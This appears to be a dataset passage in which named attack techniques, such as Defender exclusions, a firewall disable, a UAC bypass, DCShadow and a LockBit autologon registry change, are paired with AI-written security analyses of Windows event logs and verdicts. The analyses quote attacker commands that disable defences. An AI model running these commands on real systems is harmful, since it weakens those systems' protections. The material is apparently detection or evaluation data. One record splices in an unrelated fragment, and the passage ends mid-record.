3. **Review Account Activity**: Further review `admin_test`'s activity logs to ensure compliance with the organization's security policy.
4. **Network Traffic Analysis**: Investigate any suspicious outbound traffic from `Server002` that may coincide with the activities observed.
5. **Continuous Monitoring**: Initiate more robust monitoring to quickly detect similarly suspicious activities in the future.

Further investigation is warranted to confirm whether these actions were part of legitimate administrative duties or represent malicious intent."
Tamper with Windows Defender Evade Scanning -Extension,"Based on the review and analysis of the provided logs, here are the findings:

**System and Application Logs:**
1. **Time Change Events (System Log)**: Events related to time adjustments are observed, where `svchost.exe` is setting new time values. The adjustment from `08:53:39.5410749` to `08:53:33.5459928` is notable, but such time synchronization via Windows Time Service (`time.windows.com`) using `svchost.exe` is expected behavior.

2. **Update Processes (Application Log)**: The events related to `edgeupdate` indicate processes starting and stopping associated with Microsoft Edge updates. This pattern aligns with legitimate update procedures.

**Windows PowerShell Logs:**
1. **PowerShell Script Execution**: There's a PowerShell execution altering Windows Defender preferences by excluding `.exe` files: 
   - Command: `powershell.exe & {$excludedExts= "".exe""; Add-MpPreference -ExclusionExtension $excludedExts}`
   - This action can degrade system security by making it easier for malicious files to avoid detection.

**Sysmon Logs:**
1. **Multiple Executions of System Utilities**: We see execution logs for typical command line utilities like `HOSTNAME.EXE`, `whoami.exe`, `wevtutil.exe`, and `conhost.exe`, run by the user `SERVER002\\admin_test`. These are standard utilities, but the frequency and sequence may suggest an automated script or suspicious manual probing.

2. **Repeated Edge Update Activities**: Multiple instances of Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) are launched and executed. This aligns with typical update mechanisms. 

3. **Windows Service (TiWorker.exe, TrustedInstaller.exe) Execution**: These processes are part of the Windows Update system, indicating standard update activities.

**Conclusions:**
- **Suspicious PowerShell Activity**: The modification to the Defender's exclusion list is highly suspicious, indicating potential malicious intent to hide executable files from being scanned by Windows Defender.
- **Normal Administrative Activity Elsewhere**: The extensive activity of standard system utilities could be consistent with administrative tasks; however, it requires context. If prevalent without cause, it may warrant further review for unusual patterns.
- **Edge Update Behavior is Benign**: All Edge-related activity seems consistent with legitimate update processes, showing no immediate signs of compromise.

**Resolution: SUSPICIOUS**
- **Threat/Risk Assessment**: The alteration of Windows Defender settings requires immediate investigation to ensure no further unauthorized configurations or malware presence.
- **Guidance**: Recommend checking the legitimacy of PowerShell commands and verifying policy changes weren’t unauthorized. Review user activity for `admin_test` to confirm behavior patterns. If actions remain unexplained, conduct a full malware scan and consider resetting Windows Defender policies."
WMIC Tamper with Windows Defender Evade Scanning Folder,"### Detailed Analysis of the Logs:

1. **PowerShell Logs:**
   - No PowerShell logs provided were provided for analysis.

2. **Application Log:**
   - The only entry here is from ""Microsoft-Windows-Security-SPP"" with no apparent unusual behavior. The Software Protection Platform Service is a normal service in Windows.

3. **Sysmon Logs:**
   - Several entries indicate multiple executions of `wevtutil.exe` and `conhost.exe`, all under the user `SERVER002\admin_test`.
   - These processes are legitimate Windows processes used for managing event logs and console windows. However, the frequency and pattern of the usage might be typical in an automated script or task and doesn't suggest immediate malicious behavior.
   - The execution of `cmd.exe` with the command line `wmic.exe /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath=\""file\""` is suspicious. It suggests an attempt to add an exclusion path in Windows Defender, potentially to bypass security measures, which is indicative of malicious intent, especially given the context.
   - The process tree shows legitimate Windows processes launching each other in a typical fashion, except for the direct execution of `whoami.exe` and `hostname.exe`, which could be harmless if used for information gathering. However, combined with the `wmic` command, it suggests the possibility of information gathering or privilege escalation activities.

4. **System Log:**
   - The system time was changed as indicated by several kernel events (EventID: 1 & 24), and they repeat within a very short period. While time changes can happen normally, frequent changes may indicate an attempt to manipulate timestamps on files or logs, which can be suspicious.
   - The time source is set to `time.windows.com`, without any unusual configuration.

5. **Security Log:**
   - Two events of time change (EventID: 4616) logged under `LOCAL SERVICE`. They correspond with what is observed in the system logs.

### Assessment:

The primary concern arises from the Sysmon logs, particularly the use of `wmic.exe` to modify Windows Defender settings, which is suspicious. This often indicates an attempt by malicious actors to evade detection. The repeated time changes could also be indicative of an attempt to hinder incident response or logging.

### Resolution:

- **SUSPICIOUS**: 
  The command usage to modify Windows Defender settings, along with frequent time changes, warrants further investigation. This activity could be benign if it was part of a legitimate administrative task, yet it also aligns with tactics often employed by malicious actors to manipulate system defenses and logs.

### Guidance on How to Proceed:

1. **Investigate the Source:** Identify any scripts or scheduled tasks that may have executed these commands.
2. **Review User Activity:** Determine if the actions were conducted by an authorized administrator or if the `admin_test` account was compromised.
3. **Check System Integrity:** Run comprehensive malware and integrity checks on the system to detect any malicious presence.
4. **Audit Logs:** Check other systems for similar patterns if any coordinated activity could be taking place.
5. **Secure User Accounts:** Ensure that authentication mechanisms are secure and audit account permissions for any anomalies."
Disable Microsoft Defender Firewall,"Upon analyzing the provided Windows event logs, several key points and potential indicators of suspicious activity were observed:

### System Behavior:
1. **Time Synchronization Changes:**
   - Multiple events indicate changes in system time, which might be normal if synchronized with time.windows.com. However, abrupt changes to the system time can be used to manipulate logs or bypass time-based security controls. These changes should be cross-referenced with organization policies and operations to ensure they align with typical system behavior. 

2. **Service Status Change:**
   - The ""IKE and AuthIP IPsec Keying Modules"" service was set from demand start to auto start. This might be benign, related to a network configuration change, but should be verified to ensure it aligns with normal network security practices.

### Security Events:
1. **Privileged Logon Sessions:**
   - There are logon sessions (EventID 4624) accompanied by special privilege assignments (EventID 4672) for an account “admin_test”. The privileges include SeDebugPrivilege and SeBackupPrivilege, among others, which are sensitive and should be monitored closely as they could facilitate system manipulation or data access beyond normal tasks.

2. **Failed or Abnormal Logon:**
   - No failed logons are immediately observable; however, the presence of privilege escalation on the same timestamps as logon events should be verified against known user activity for appropriateness.

3. **Command Execution:**
   - A command was executed via `cmd.exe` to turn off the Windows Firewall: `""cmd.exe"" /c netsh advfirewall set currentprofile state off`. This action is highly suspicious as it reduces system defenses and should be investigated immediately. This action appears unauthorized unless corroborated by administrator tasks or network policies.

4. **Process Execution:**
   - Processes such as `whoami.exe` and `hostname.exe` were executed prior to and around potentially suspicious command executions. It suggests user identity verification and system checking, which can be reconnaissance steps in compromise scenarios.

5. **Unaccounted Process Execution:**
   - Instances of `wevtutil.exe` usage, a utility often used for reading event logs, might indicate log tampering attempts.

### Recommendations and Resolution:
Given the observed potential disabling of the firewall, which poses a significant security risk, and the unusual activity observed around privileged processes and utilities that could affect security logs:

- **Investigation Required:** The activities are flagged as **SUSPICIOUS**. Further investigation should include:
  - Verifying whether the `admin_test` account activity aligns with administrative tasks and whether the user executed the commands or if the account was compromised.
  - Reviewing security configurations and policies related to the time synchronization and service status changes.
  - Monitoring ongoing network traffic and system behavior post these events for any signs of broader attack patterns.

Immediate action should be taken to address any unauthorized firewall changes and log in activities to ensure that the system integrity is maintained, and potential breaches are remediated."
UACME Bypass Method 39,"### Analysis of the Logs

#### Suspicious Elements Found:

1. **Command Execution via `cmd.exe` and `powershell.exe`:**
   - **Log Entry:** A command execution indicates the use of `cmd.exe` which is invoked to execute a potential script or executable file named `39 Akagi64.exe` located in an unusual path: 
     `""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script\\39 Akagi64.exe""`.
   - **Concern:** This action is typically suspicious due to the unconventional path and the use of command line to launch executables from a temporary directory, which can be an indicator of malicious activity.
   
2. **Frequent Execution of `MicrosoftEdgeUpdate` Components:** 
   - **Log Entries:** Multiple instances of `MicrosoftEdgeUpdate.exe` and similarly related processes like `MicrosoftEdgeUpdateSetup` and `MicrosoftEdgeUpdateComRegisterShell64.exe` are seen executing around the same time.
   - **Concern:** Although updates are common, the frequency and varied paths (including temporary directories) for these update-related files could suggest misuse, potentially for propagating malicious payloads.

3. **Execution of `wevtutil.exe`:**
   - **Log Entries:** The use of `wevtutil.exe` multiple times during the period being analyzed.
   - **Concern:** This utility is used to manage event logs, and its automated or frequent use, especially when aligned with other suspicious activity, could suggest log tampering efforts to hide illicit activities.

#### Evidence of Potential Compromise:

- The presence of executable commands from paths located within `AppData\Local\Temp`, and the utility executables being fired off unsupervised, which is unusual for production environments if they are not part of scheduled tasks or known administrative activities.

#### Context and Additional Considerations:

- The execution events for `MicrosoftEdgeUpdate` processes, despite being part of legitimate software behavior during updates, should not typically emanate from temporary directories outside of expected IT-managed operations.
- Use of `cmd.exe` and `powershell.exe` to perform actions indicating system or administrative functions without clear origin or authorization further complicates the scenario, given these processes are often leveraged by malicious actors to execute scripts or load external files dynamically.

### Security Assessment and Resolution:

Based on the patterns and concerns raised, most notably the unconventional invocation of scripts/executables from temporary directories, there exists a significant risk that these operations may be related to nefarious intent, potentially involving:
- Execution of unauthorized scripts/executables.
- Possible persistence or lateral movement attempts within the network. 

### Final Resolution: 
**SUSPICIOUS**

These activities require further investigation to confirm the nature of the scripts executed, the intentions behind the repetitive use of update executables, and to verify if any changes to system configurations or unauthorized access have occurred. Next steps should include:
- Verifying the integrity and legitimacy of the involved files (e.g., `39 Akagi64.exe`).
- Reviewing scheduled tasks and IT logs for sanctioned updates.
- Conducting scans using updated security tools to rule out any active threats."
InstallUtil class constructor method call,"Upon reviewing the provided logs, several observations can be made regarding the potential for suspicious or malicious activity:

1. **Time Manipulation (Event ID 4616 in Security Log)**: There appears to be rapid and repetitive changes in system time. System time changes can be benign if the system clock is being synchronized with a time server. However, such activities could also be used by attackers to cover tracks or create confusion in event logs. This requires further examination to ascertain whether it aligns with any legitimate time synchronization activity.

2. **PowerShell Activity (PowerShell Log)**: The PowerShell logs show execution of a script from a temporary directory with the execution of `InstallUtil`. This is a known technique used in attacks, typically to run arbitrary code by leveraging `InstallUtil.exe`. The context and origin of the script as well as its integrity should be verified.

3. **Sysmon Logs**:
   - **Process Creations**: The `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.004.dll` and activities involving `powershell.exe` executing scripts from temporary directories are concerning. They suggest possible fileless malware or other attack techniques using PowerShell.
   - **Compiler Usage**: Execution of `csc.exe`, which is the C# command line compiler, suggests potential for code compilation in a temporary directory. This could indicate malicious activities where dynamic code execution is taking place.

4. **Edge Update Activity**: There are multiple `MicrosoftEdgeUpdate.exe` and related activities logged. While frequent updates or service activities could be legitimate, it is critical to assess the context, such as checking scheduled tasks, installed applications, and related update logs to determine if any versions or paths look anomalous.

### Overall Assessment
- Based on the repeated time changes, suspicious PowerShell script execution from temporary directories, and dynamic code compilation, there's a strong potential for malicious activity. 
- The usage of known attack vectors like `InstallUtil.exe` execution via PowerShell strengthens the suspicion of a compromise.

### Resolution
- **SUSPICIOUS**: The logs contain behaviors typical of malicious activity but require further investigation to confirm or rule out a compromise. This includes verifying the legitimacy of executed PowerShell scripts, analyzing time change rationales, and confirming if any processes or file paths are part of known legitimate operations.
  
### Guidance
- Conduct a forensic investigation focusing on the source and purpose of the PowerShell scripts executed and analyze them for any unauthorized changes or suspicious activities.
- Verify the legitimacy of the time change events, potentially cross-referencing with system management and policy settings.
- Review the system’s update logs and scheduled tasks for any unusual configurations or frequencies that could relate to the Edge Update activities.
- Explore endpoint protection logs for any additional information or alerts that could correlate with the suspicious activities detected in these logs."
Allow Executable Through Firewall Located in Non-Standard Location,"### Analysis of the Windows Event Logs

#### System Log
1. **Time Synchronization Events**: 
   - The logs record multiple entries related to time adjustments and synchronization services. These adjustments are standard behavior when a system's clock is synchronized with a time server (`time.windows.com`). While important for auditing events, these don't inherently indicate malicious activity.

#### Application Log
1. **Edge Update Service Stopped**: 
   - The edgeupdate service stopped, which is recorded twice. The stopping of a service is typical system behavior, especially when updates are being processed. Without further evidence of suspicious behavior surrounding these entries, these are likely benign.

#### PowerShell Log
1. **PowerShell Script Execution**: 
   - The logs show PowerShell being used to copy an executable file (`fileTest.exe`) from a temporary directory to another location and then adding a firewall rule to allow its execution. The usage of `Copy-Item` and `netsh` for firewall modification through PowerShell without further context can be suspicious, possibly indicating an attempt to bypass security measures or deploy potentially unwanted software.
   - This behavior requires further investigation as it could either be a legitimate administrative task (such as deploying an internal tool) or a sign of malicious activity.

#### Sysmon Log
1. **Process Executions**: 
   - Various process executions by `admin_test` user, such as system utilities (`hostname.exe`, `whoami.exe`), and the frequent invocation of `wevtutil.exe` and `conhost.exe`. These actions by themselves don't necessarily indicate malicious behavior but should be reviewed further to determine intent, especially in the context of scripted automated actions or commands executed remotely.
   - The use of `wevtutil` often involves querying or managing event logs, and its presence in a sequence of suspicious activities could be noteworthy.
   - **Process Integrity Levels**: High integrity levels indicate operations are executed with elevated privileges, potentially allowing system changes which, combined with suspicious behavior, might be a red flag.
   
2. **EdgeUpdate Activities**:
   - Numerous entries related to `MicrosoftEdgeUpdate.exe` are normal for systems utilizing Microsoft software updates. However, given the prominence of these entries, it's essential to verify that these processes are legitimate and not being masqueraded by malicious look-alike executables.

### Assessment
The presence of PowerShell script execution to handle potentially unwanted file operations and firewall modifications is a noteworthy element. The logs do not supply enough information to confirm unequivocally whether the actions are malicious but highlight activities that could be part of a lateral movement, privilege escalation, or data exfiltration process if enacted with malicious intent.

### Recommendation
- **Investigate the PowerShell Activity**: Validate whether the PowerShell commands and associated executable (`fileTest.exe`) are sanctioned administrative actions. If unsanctioned, perform a detailed file analysis and assess the system's security posture.
- **User Behavior Analysis**: Review the context under which `admin_test` executed various administrative tools (`wevtutil`, `whoami`), and determine if these were part of legitimate operations or unauthorized actions.
- **Review Security Controls**: Ensure application whitelisting, regular monitoring of high-integrity processes, and logging are in place to detect and prevent unauthorized access or execution of potentially harmful scripts and executables.

### Resolution
**SUSPICIOUS** - The activity in the logs appears questionable, primarily due to the PowerShell commands manipulating files and firewall settings without clear justification, meriting further investigation to rule out potential compromise."
LockBit Black - Use Registry Editor to turn on automatic logon -cmd,"### Detailed Analysis:

Upon analyzing the provided Windows event logs, here are the key observations:

#### Sysmon Logs:
- The logs show a series of executions of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe`. Operations involving `wevtutil.exe` may indicate attempts to manage or manipulate event logs, which can be a red flag in some contexts but requires further context to ascertain intent.
- More concerning is the execution of `cmd.exe` with a command line that updates the Windows registry to enable AutoAdminLogon:
  ```
  ""cmd.exe"" /c reg add ""HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v AutoAdminLogon /t REG_DWORD /d 1 /f & ...
  ```
  This script changes registry settings to automatically log in as an administrator, a highly risky and likely unauthorized change that exposes the system to vulnerabilities.

#### Application Log:
- The event recorded by the Software Protection Platform Service (Event ID 16384) doesn't show direct malicious activity but is worth noting for any potential correlation with the rest of the activities.

#### System Log:
- The kernel-general and time-service indicate time changes (Event ID 24 and 1) and synchronizations with an NTP server, which is normal system behavior for clock adjustments. However, this context alone is not suspicious.

#### Security Log:
- Time change auditing events (Event ID 4616) confirm time adjustments as routine actions by the system service `svchost.exe`.

### Assessment:
- **Process Execution**: There are normal operations by legitimate Windows processes such as `whoami.exe` and `hostname.exe`. However, multiple instances of exported event logs (`wevtutil.exe`) without justification could be indicative of malicious intent to cover tracks.
  
- **Registry Modification**: The modification to enable AutoAdminLogon with default username and password provided is a severe security risk. Typically, this would not be an authorized activity unless specifically configured for a controlled environment.

### Conclusion:
Given the registry modifications and their potential for misuse, alongside the possible attempt to manipulate logs, the activity appears to be indicative of potentially malicious intent.

### Resolution:
- **Resolution**: **MALICIOUS**

### Guidance:
1. **Immediate Actions**:
   - Isolate the affected host to prevent further unauthorized access.
   - Investigate other systems for similar registry changes or signs of unauthorized access.
   
2. **Remediation**:
   - Revert the registry changes and ensure AutoAdminLogon is disabled.
   - Change all passwords for critical accounts, particularly those with administrative privileges.
   
3. **Post-Incident Analysis**:
   - Review access logs and identify potential vectors of compromise.
   - Consider implementing additional monitoring controls for registry and event log activities.

4. **Future Mitigations**:
   - Strengthen security education for users about the risks of unauthorized changes.
   - Deploy practices to alert on sudden registry modifications involving AutoAdminLogon settings."
Windows HideSCAPower Group Policy Feature,"### Detailed Analysis:

#### Application Log:
1. **Software Protection Platform Service (Event ID 16384)**:
   - This log appears from the Software Protection Platform, which is commonly used to maintain Windows licenses. The mention of ""RulesEngine"" does not point to malicious activity directly without further context.

2. **EdgeUpdate (Event ID 0)**:
   - The log mentions the stopping of the EdgeUpdate service. This is a typical operation when a service stops, either due to a system update, shutdown, or manual stoppage. Without any additional context or persistence methods leveraging EdgeUpdate, this action alone is benign.

#### Security Log:
1. **Event ID 4616** - Time Change:
   - These logs indicate a change in system time, caused by the SVCHOST process. Time manipulation could be suspicious in certain contexts, such as evasion of logging or schedule manipulation. However, a timezone adjustment or sync with a time source are legitimate reasons for time changes.

#### Sysmon Log:
1. **Process Executions**:
   - **Multiple wevtutil.exe and conhost.exe executions**:
     - Observed wevtutil and conhost processes being frequently executed. Both wevtutil.exe and conhost.exe are legitimate Windows processes. Frequent execution might suggest script-based management but isn't inherently malicious without associated threatening behavior.
   
   - **The execution of HOSTNAME.EXE and WHOAMI.EXE**:
     - These are typical utilities used for basic information listing. WHOAMI.EXE execution to check user context is a common action for both legitimate administrative checks and by attackers. However, context is critical, and its singular use does not indicate malice.

   - **Registry Modification using CMD.EXE**:
     - The suspicious command execution: `cmd.exe /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCAPower /t REG_DWORD /d 1 /f`
     - This modifies registry keys related to user interface behavior, which could indicate persistence tactics by disabling certain UI elements. This action is suspicious.

2. **Microsoft Edge Update Executions**:
   - The frequent execution of Microsoft Edge Update and associated processes like MicrosoftEdgeUpdateSetup, mostly commanded with parameters for update (`/svc`, `/regserver`). Updates to applications are common, especially for browsers. This doesn't appear malicious unless leveraged as a persistence or attack vector.

#### System Log:
1. **Kernel-General Time Change logs**:
   - The time change in sync with the security logs is observed; this further confirms the system adjusted its time potentially due to a NTP sync. This could be normal behavior unless paired with other malicious indicators.

### Assessment:
- **Suspicious Activities:**
  - The registry modification to obscure UI elements (via `HideSCAPower`) suggests an attempt to alter user interface settings maliciously. This is considered suspicious and warrants further investigation, especially regarding what triggered these changes.

### Recommended Actions:
1. Investigate the context of the registry modification:
   - Evaluate if there's a script or unauthorized process that's triggering registry edits.
2. Check for persistence mechanisms:
   - Analyze further any scripts or planned tasks that occur around these events, especially related to registry changes.
3. Use endpoint detection solutions to ensure there is no associated malware or script.

### Final Resolution:
- **SUSPICIOUS** - Logs have entries that indicate potentially unauthorized changes to system settings a comprehensive investigation is warranted."
DCShadow (Active Directory),"Upon detailed analysis of the provided Windows event logs, the following observations were made:

### Suspicious/Anomalous Behavior:
1. **Use of PowerShell with Suspicious Script**:
   - The logs show execution of `powershell.exe` with a command that involves setting up a ""fake DC server"" and running commands like `lsadump::dcshadow`. This is indicative of a technique known as **DCShadow**, often used in advanced attacks such as those involving Active Directory manipulation and privilege escalation.
   - The command involves commands typically associated with credential theft and manipulation of Active Directory objects, which is not typical behavior for standard administrative tasks.

2. **Creation and Execution of External Scripts**:
   - The logs also indicate scripts being executed from the `C:\Users\ADMIN_~1\AppData\Local\Temp\\` directory using `PSTools`. The nature of these scripts, with references to `lsadump` and other commands typically used in penetration testing or malicious activity, further substantiates the suspicious nature.

3. **High Integrity Level**:
   - The commands are executed with high integrity, suggesting they have elevated privileges, further indicating that if unauthorized, this could be a compromise.

4. **Frequent Process Creation with System Tools**:
   - There is a repetitive pattern of `wevtutil.exe` being called, which is often used for event log management. Though this may be benign in specific contexts, the absence of routine task descriptions and its correlation with other flagged activities raises suspicion.

### Indicators of Malicious Activity or Compromise:
- **DCShadow Attack Technique**:
  - The usage details clearly point towards an attempt at using DCShadow, a malicious technique leveraging Directory Replication Service (DRS) to introduce changes that are difficult to track within Active Directory.
- **PowerShell Command Execution**:
  - Executing PowerShell with such specific and technically complex scripts strongly suggests malicious intent or at least unauthorized administrative activity.
- **Potential Credential Theft**:
  - The mention of `lsadump` along with `dcshadow` usually aims at dumping credentials or modifying sensitive configurations within a Windows Active Directory environment.

### Threats and Risks Identified:
- **Privilege Escalation and Unauthorized Access**: Successful execution of these commands can result in unauthorized access to sensitive information and privilege escalation within the Active Directory environment.
- **Persistence Mechanism**: If malicious, this attack could enable the threat actor to maintain access and control over the domain environment.
- **Data Exfiltration or Tampering**: The intention behind such scripts typically involves extracting sensitive data, altering configurations, or setting the stage for further malicious activities.

### Guidance on How to Proceed:
1. **Immediate Investigation**: Validate and, if necessary, contain the activity by analyzing how these commands were triggered—whether it was a legitimate administrative task or unauthorized access.
2. **Audit User Activity**: Review user privileges and recent account changes related to `SERVER002\admin_test` and associated accounts.
3. **Enhanced Monitoring**: Increase logging and monitoring of PowerShell activities, especially in high-integrity contexts.
4. **Consider Incident Response**: Based on further confirmation, engage in incident response to eradicate any active threats and review security posture.
5. **Review AD Changes**: Check for unauthorized changes in the domain controller and Active Directory objects, possibly seeking to revert malicious alterations.

### Resolution: **MALICIOUS**
The activity documented in the logs is identified as malicious due to clear indicators of DCShadow technique usage, suggestive of attempts at high privilege level manipulation within a Windows server environment. Immediate attention and containment are recommended."
Lockbit Black - Use Registry Editor to turn on automatic logon -Powershell,"### Analysis

#### Suspicious/Anomalous Behavior:

1. **Frequent Use of System Utilities:**
   - The logs show repetitive execution of system utilities such as `wevtutil.exe` and `conhost.exe` within seconds. While these utilities are part of legitimate Windows operations, their rapid and repeated execution could indicate script-based automation, which might be used in malicious scenarios.

2. **Suspicious PowerShell Command:**
   - A PowerShell script is altering registry settings related to autologin, username, domain, and password stored as plaintext in the registry. The specific registry entries implicated (`AutoAdminLogon`, `DefaultUserName`, `DefaultDomainName`, and `DefaultPassword`) are used to automatically log into Windows without user intervention. This is a serious security risk and is highly indicative of either malicious behavior or severe security misconfiguration.

3. **High Integrity and User Context:**
   - Processes are running under a High Integrity level for the user `SERVER002\admin_test`. High integrity level processes can perform administrative actions, and their misuse could compromise system security. When these processes are tied to scripting or registry changes, it amplifies the potential threat.

#### Indicators of Malicious Activity:

- **PowerShell Script Execution:**
  The PowerShell command attempts to set auto-login capabilities, including a hardcoded password for an administrator account. Storing sensitive credentials in registry keys in plaintext is a red flag for potential compromise as attackers often exploit such misconfigurations to maintain persistence and leverage escalated privileges.

- **The Context of Execution:**
  All observed activity is carried out by the `admin_test` user, suggesting either unauthorized use or misconfiguration by a user with administrative privileges.

- **Repetitive Execution of Specific System Utilities:**
  `wevtutil.exe` and `conhost.exe` executing consecutively in large numbers without an obvious benign pattern indicates either a scripted operation or potential testing/profiling by a malicious actor.

### Assessment

Given the execution of a PowerShell script that modifies critical registry keys to allow automatic logins with plaintext passwords, this is a clear indicator of potentially malicious intent. The activities associated with the `admin_test` user, along with the use of system utilities, suggest a risk of unauthorized access or system misconfiguration potentially exploitable by external threats.

### Resolution

**MALICIOUS**

### Guidance and Next Steps

1. **Immediate Actions:**
   - **Revoke and Investigate Credentials:** Investigate the `admin_test` account activities, reset credentials immediately, and determine whether this account's privileges align with its role.
   - **Review Configuration:** Verify the necessity and correct configuration of auto-login features and remove any plaintext passwords from the registry.
   - **Control Account Privileges:** Re-evaluate administrative account privileges and apply the principle of least privilege where possible.

2. **Threat Hunting:**
   - Analyze whether similar scripts or command sequences exist elsewhere in the system or network.
   - Determine if any unauthorized access attempts occurred concurrently with these activities.

3. **Monitoring and Logging:**
   - Increase monitoring and logging for scripts and other administrative tasks to rapidly detect unauthorized actions.
   - Employ File Integrity Monitoring (FIM) on critical system directories and sensitive configuration files.

4. **Further Investigation:**
   - Examine any potential impacts these actions had on security controls and overall system integrity.
   - Consider the possibility of external exploitation and assess for additional malware or persistence mechanisms.

The observed behavior poses a serious security risk, highlighting the necessity for immediate action to prevent further compromise or damage."
Tamper with Windows Defender Evade Scanning -Folder,"## Analysis

### Windows PowerShell Log

1. **PowerShell Exclusion:**
   - The command `Add-MpPreference -ExclusionPath $excludedpath` is logged. It appears that a PowerShell session was used to exclude the path ""C:\\Temp"" from Windows Defender scans. While this might be legitimate maintenance or troubleshooting activity, it is also a known technique used by malware to evade antivirus detection, as excluding a folder from scans can allow malicious content to persist undetected.

### Security Log

1. **Privilege Escalation:**
   - **Event ID 4672:** Indicates a privileged logon session for the user ""admin_test"".
   - The user ""admin_test"" is associated with high privileges, such as SeDebugPrivilege and SeBackupPrivilege, among others, which are typically required for administrative tasks or potential attack scenarios.
   - **Event ID 4624:** Suggests a network logon (Type 3) using NTLM, which is a normal activity but should be verified against legitimate access patterns.

2. **Suspicious Logon Activity:**
   - The high number of privileged logons and attributes such as SeDebugPrivilege can be concerning. Continuous monitoring for unusual patterns or if similar accounts show activity should be undertaken.

### Sysmon Log

1. **Process Creation:**
   - There are several system utilities like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `wvmiPrvSE.exe` being executed. These are legitimate system utilities but are often used script executions or lateral movement in compromise scenarios.
   - The `powershell.exe` command noted in the logs corresponds to the exclusion activity noted above, linking the behavior to potentially evade detection.

2. **Frequent Edge Update Executions:**
   - The activity related to `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateSetup_X86.exe` with multiple executions within short periods seem consistent with a software update process but should be verified to ensure these updates are expected.

### System Log

1. **Time Change Events:**
   - The `SystemTime` changes in a very short period may indicate potential attempts to manipulate system time, although such changes can also occur during legitimate time synchronization tasks. However, the frequency and existence in the same timestamps warrant attention and further validation.

## Assessment

- The PowerShell log indicates a potential attempt to exclude the ""C:\\Temp"" directory from antivirus scanning. This is a commonly used technique by threat actors to hide malicious activities and avoid detection.
- There is an observed privilege escalation activity (Event ID 4672) associated with the user ""admin_test"". Monitoring and validation of the legitimacy of this account and its activities should be conducted.
- Frequent execution of system utilities and Microsoft Edge Update processes should be verified against normal operational patterns to confirm they are expected and benign.

## Conclusion

**Resolution: SUSPICIOUS**

The activity observed indicates behavior that could be associated with either legitimate administrative activity or an attempt at stealthy malicious operations. Further investigation is necessary to assess the legitimacy of the PowerShell exclusion, the privileged actions by ""admin_test"", and the corresponding patterns of software updates against the organization’s update policies. Immediate steps should be taken to:
- Verify the necessity of the PowerShell exclusion by consulting the responsible IT personnel.
- Audit the behavior of the ""admin_test"" account for activities outside of standard operations.
- Analyze the frequency and necessity of Edge Updates to verify authenticity and prevent potential use in evading security detections."
Masquerading - cscript.exe running as notepad.exe,"### Log Analysis and Findings:

#### 1. **Windows PowerShell Log:**
- The provided logs do not contain any entries for Windows PowerShell events. Therefore, no analysis can be conducted for this log.

#### 2. **System Log:**
- **EventID 44 & 43 & 19**: These logs indicate successful updates of Microsoft Defender Antivirus (Security Intelligence Update KB2267602). These entries are typical and do not indicate any malicious activity.

#### 3. **Sysmon Log:**
- **System Utilities Executions**:
  - ***hostname.exe***, ***whoami.exe***, and ***conhost.exe***: Simple utility processes executed by the user ""SERVER002\\admin_test"" with high integrity level. These actions are generally benign unless part of a broader malicious pattern. The repeated execution of `hostname.exe` and `whoami.exe` in quick succession may suggest attempts to enumerate the system, potentially indicating suspicious behavior if not contextualized by routine administrative actions.
  - ***wevtutil.exe***: Executed multiple times by the same user. Wevtutil is used for managing event logs, which can be benign or part of suspicious activity if employed to manipulate logs.
  
- **Potentially Malicious Activity**:
  - ***cmd.exe***: The command line includes a command to copy `cscript.exe` to `notepad.exe` in the user's AppData directory and execute it, hinting at possible attempts to disguise a script execution under a known benign application name (Notepad). Subsequent execution from AppData is suspicious due to the use of a different name and location.
  - ***notepad.exe***: Noted as `cscript.exe` renamed to `notepad.exe` in the user's AppData with a new hash. This behavior is indicative of an attempt to bypass detection (e.g., evasion of security tools by masquerading as a common process).
  - The process flow also shows `cmd.exe` spawning `notepad.exe`, reinforcing the above assertion.

#### 4. **Application Log:**
- **EventID 15**: Indicates that Windows Defender is active. This doesn't highlight malicious activity but shows an enabled security state.

#### 5. **Security Log:**
- The logs provided do not contain any security events to analyze.

### Assessment:
Given the process related to `cmd.exe` and the suspicious command sequence observed in the Sysmon logs, this behavior appears to be indicative of potential prelude steps in executing malicious scripts or bypass techniques by utilizing renamed executables.

### Resolution:
- **SUSPICIOUS**: The event logs contain suspicious activity that warrants a deeper investigation. The questionable command line activity involving file disguise, attempts to execute from unconventional paths, and possible log tampering via wevtutil, suggests potential malicious behavior.

2. Windows Update: The update for Microsoft Defender Antivirus indicates ongoing security measures, which are standard practice.

**Security Log Analysis:**
1. Event ID 4624 indicates a successful logon session by the system process `services.exe`. The logon type is 5, which is a service startup. This is regular behavior.
2. Event ID 4672 shows a user (SYSTEM) obtaining special privileges, such as `SeDebugPrivilege`, which is common for system-managed accounts performing tasks. 

**Sysmon Log Analysis:**
1. Frequent Execution of Standard Windows Processes: There are records of `wevtutil.exe`, `conhost.exe`, and `hostname.exe`, which are typical Windows processes. The user executing these commands is `SERVER002\admin_test`, and they seem to be running administrative tasks or diagnostics, given the use of `whoami` and `cmd.exe`.
2. Cmd.exe Execution: A command updating registry settings related to the proxy server was executed. This action can be part of legitimate administrative configuration but could also be indicative of an unauthorized change if not sanctioned.
3. WMI and MusNotification Processes: The starting of `WmiPrvSE.exe` and `MusNotification.exe` corresponds to Windows service operations and notification tasks, which align with standard OS behavior.

**Application Log Analysis:**
- Windows Defender is active with `SECURITY_PRODUCT_STATE_ON`, indicating that security defenses are in place.

**Indicators of Suspicious Activity:**
- The use of `cmd.exe` to edit registry settings related to the internet proxy could be considered suspicious if it was not known or planned by authorized personnel. While this could be an administrative function, the lack of context around this change necessitates further investigation.

**Conclusion:**
The activity observed in the logs primarily appears to be routine, involving system processes, services starting, and administrative actions consistent with regular maintenance tasks or specific configurations. However, the registry change related to internet proxy settings carried out by `cmd.exe` requires additional context to determine its legitimacy. If this action was unexpected or unauthorized, it could be part of malicious behavior aimed at redirecting network traffic.

**Resolution:**
